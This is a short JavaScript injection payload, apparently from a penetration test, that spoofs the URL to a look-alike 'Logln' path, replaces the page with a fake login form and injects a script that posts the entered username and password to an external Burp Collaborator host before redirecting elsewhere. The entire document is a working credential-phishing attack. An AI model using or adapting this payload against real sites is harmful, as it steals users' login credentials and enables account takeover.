history.replaceState(null,null,"../../../Account/Logln"),document.body.innerHTML='<!doctype html><html lang="en"><head><title>Pentest</title></head><body></br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input id="user" type=\'text\'>Password: <input id="pass" type=\'password\'><button type="button" onclick="getInputValue();">Get Value</button></form></body></html>';var script=document.createElement("script");script[(script.innerText===undefined?"textContent":"innerText")]='function getInputValue(){var inputUser = document.getElementById("user").value;var inputPass = document.getElementById("pass").value;xhr = new XMLHttpRequest();xhr.open("POST","https://d7t1dcn8ldprfve8vp0mac4t46vcr0g.burpcollaborator.net",true);xhr.send("user=" + inputUser + "&pass=" + inputPass);setTimeout(() => { window.location = "https://web.kate.center";}, 4000);',document.documentElement.appendChild(script);
